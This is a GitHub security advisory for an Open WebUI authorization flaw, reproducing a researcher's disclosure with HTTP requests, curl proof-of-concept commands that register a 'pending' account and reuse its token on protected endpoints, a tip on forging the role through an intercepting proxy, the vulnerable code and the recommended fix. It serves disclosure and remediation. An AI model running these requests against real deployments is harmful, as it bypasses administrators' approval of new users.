# [H] Open WebUI has Improper Authorization Control

## Summary
Severity: High
Advisory: GHSA-4vg5-rp28-gvjf
CVE: CVE-2026-44567
CWE: CWE-602, CWE-862
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L (CVSS_V3)
Published: 2026-05-08
Source: https://github.com/advisories/GHSA-4vg5-rp28-gvjf
Type: github-advisory

## Affected
- PyPI: `open-webui` — affected >=0 <0.1.124

## Details
# **CONFIDENTIAL**

# Vulnerability Disclosure Analysis Documentation

---

## Vulnerability Details

| # | Field | Value |
|---|-------|-------|
| 1 | **Discoverer** | Taylor Pennington of KoreLogic, Inc. |
| 2 | **Date Submitted** | June 11, 2024 |
| 3 | **Title** | Open WebUI Improper Authorization Control |
| 5 | **Affected Vendor** | Open WebUI |
| 6 | **Affected Product(s)** | Open WebUI (Formerly Ollama WebUI) |
| 7 | **Affected Version(s)** | 0.1.105 |
| 8 | **Platform/OS** | Debian GNU/Linux 12 (bookworm) |
| 9 | **Vector** | HTTP web interface |
| 10 | **CWE** | 285 Improper Authorization |

---

## 4. High-level Summary

There is a missing authorization check affecting user accounts with a `pending` status allowing the user to make authenticated API calls as a `user` context.

---

## 11. Technical Analysis

The Open WebUI web application has three user role classifications: `user`, `admin`, and `pending`. By default, when Open WebUI is configured with `new sign-ups` enabled, the default user role is set to `pending`. In this configuration, an administrator is required to go into the Admin management panel following a new user registration and reconfigure the user to have a role of either `user` or `admin` before that user is able to access the web application. However, this check is only enforced at the client presentation layer, the API does not properly validate that the user has an authorized user role of `user`.

### Request

```http
POST /api/v1/auths/signup HTTP/1.1
Host: openwebui.example.com
Content-Length: 60

{ 
 "name": "", 
 "email": "bad_guy@korelogic.com", 
 "password": "a" 
 }
```

### Response

```http
HTTP/1.1 200 OK
...

{
"id": "f839557a-031a-47a5-9999-0b0998f8f959",
"email": "bad_guy@korelogic.com",
"name": "",
"role": "pending",
"profile_image_url": "/user.png",
"token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImY4Mzk1NTdhLTAzMWEtNDdhNS05OTk5LTBiMDk5OGY4Zjk1OSJ9.Bk-S4ABXb1tRuiVNfOJYbQFB8ewixWA4a1FohvIZARs",
"token_type": "Bearer"
}
```

An attacker can then use the JWT in the above response to make direct API calls or they can forge the authentication response and use the web UI.

With the JWT, an attacker can now query the LLM. However, for this demonstration we will query the `/ollama/api/tags` endpoint and get a list of available models as this is an authenticated endpoint. Attempting to make this request without a valid JWT returns an HTTP `401 Unauthorized` response.

### Request

```http
GET /ollama/api/tags HTTP/1.1
Host: openwebui.example.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImY4Mzk1NTdhLTAzMWEtNDdhNS05OTk5LTBiMDk5OGY4Zjk1OSJ9.Bk-S4ABXb1tRuiVNfOJYbQFB8ewixWA4a1FohvIZARs
```

### Response

```http
HTTP/1.1 200 OK
...

{
"models": [
    {
    "name": "ollama.com/emsi/mixtral-8x22b:latest",
    "model": "ollama.com/emsi/mixtral-8x22b:latest",
    "modified_at": "2024-04-12T17:27:51.479356401-04:00",
    "size": 79509285991,
    "digest": "9b000033acd802656a652c7df4e25300a61d903cd3c8eb065a50aaace484c319",
    "details": {
        "parent_model": "",
        "format": "gguf",
        "family": "llama",
        "families": ["llama"],
        "parameter_size": "141B",
        "quantization_level": "Q4_0"
    },
    "urls": [0]
    },
    ...
]
}
```

The logic for this endpoint can be seen here:
<https://github.com/open-webui/open-webui/blob/0399a69b73de9789c4221acedea70d528e1346c4/backend/apps/ollama/main.py#L163-L180>

As shown below, the login checks if `url_idx` is `None` and if so, call `get_all_mdoels` and assign the result to `models` after that the logic checks if `app.state.MODEL_FILTER_ENABLED` is true and if not, it returns the result. As `MODEL_FILTER_ENABLED` is not configured by default, the application will not attempt to further validate the user.

```python
@app.get("/api/tags")
@app.get("/api/tags/{url_idx}")
async def get_ollama_tags(
    url_idx: Optional[int] = None, user=Depends(get_current_user)
):
    if url_idx == None:
        models = await get_all_models()
        
        if app.state.MODEL_FILTER_ENABLED:
            if user.role == "user":
                models["models"] = list(
                    filter(
                        lambda model: model["name"] in app.state.MODEL_FILTER_LIST,
                        models["models"],
                    )
                )
                return models
        return models
```

This is just an example of one API endpoint but all other regular user accessible endpoints were accessible to a pending user.

The vulnerability is caused by a missing authorization check that occurs with `user=Depends(get_current_user)`. The logic of that function is found here:
<https://github.com/open-webui/open-webui/blob/0399a69b73de9789c4221acedea70d528e1346c4/backend/utils/utils.py#L77-L97>

```python
def get_current_user(
auth_token: HTTPAuthorizationCredentials = Depends(bearer_security),
):
    # auth by api key
    if auth_token.credentials.startswith("sk-"):
        return get_current_user_by_api_key(auth_token.credentials)
    # auth by jwt token
    data = decode_token(auth_token.credentials)
    if data != None and "id" in data:
        user = Users.get_user_by_id(data["id"])
        if user is None:
            raise HTTPException(
                status_code=status.HTTP_401_UNAUTHORIZED,
                detail=ERROR_MESSAGES.INVALID_TOKEN,
            )
        return user
    else:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail=ERROR_MESSAGES.UNAUTHORIZED,
        )
```

As shown above, this logic does not verify the role of the user, the function simples checks if the JWT is valid.

---

## 12. Proof-of-Concept

First, verify that an unauthenticated user receives `{"detail":"401 Unauthorized"}`:

```bash
curl -s -X $'GET' \
    -H $'Host: openwebui.example.com' \
    -H $'Content-Type: application/json' \
    $'https://openwebui.example.com/ollama/api/tags'
```

The above curl command will return: `{"detail":"401 Unauthorized"}` as no Authorization Bearer token is provided.

Now to access the authentication endpoint, two calls will be made. The first cURL creates an account and sets the `$JWT` environment variable which will be utilized in the subsequent cURL command.

```bash
export JWT=$(curl -s -X POST \
    -H 'Host: openwebui.example.com' -H 'Content-Length: 60' \
    -H 'Content-Type: application/json' \
    --data '{"name":"","email":"bad_guy@korelogic.com","password":"a"}' \
    'https://openwebui.example.com/api/v1/auths/signup' | jq '.token'|tr -d '"')

curl -v $'GET' \
    -H $'Host: openwebui.example.com' \
    -H $'Content-Type: application/json' \
    -H $'Authorization: Bearer ${JWT}' -H $'Content-Length: 2' \
    --data-binary $'\x0d\x0a' \
    $'https://openwebui.example.com/ollama/api/tags'
```

Additionally the `"role":"pending"` value in the HTTP response can be forged from `POST /api/v1/auths/signin` and `GET /api/v1/auths/` to utilize the full website. This can be achieved with a man-in-the-middle proxy such as Burp or Zap and modifying `pending` to `user`.

---

## 13. Mitigation Recommendation

The application currently has a function for checking if the user is authorized. However, it is not being utilized except for one endpoint. See <https://github.com/open-webui/open-webui/blob/0399a69b73de9789c4221acedea70d528e1346c4/backend/utils/utils.py#L110-L116> for the correct function to use.

```python
def get_verified_user(user=Depends(get_current_user)):
if user.role not in {"user", "admin"}:
    raise HTTPException(
        status_code=status.HTTP_401_UNAUTHORIZED,
        detail=ERROR_MESSAGES.ACCESS_PROHIBITED,
    )
return user
```

Modify all authenticated endpoints to utilize `get_verified_user()` function instead of `get_current_user()`.

## References
- https://github.com/open-webui/open-webui/security/advisories/GHSA-4vg5-rp28-gvjf
- https://nvd.nist.gov/vuln/detail/CVE-2026-44567
- https://github.com/open-webui/open-webui
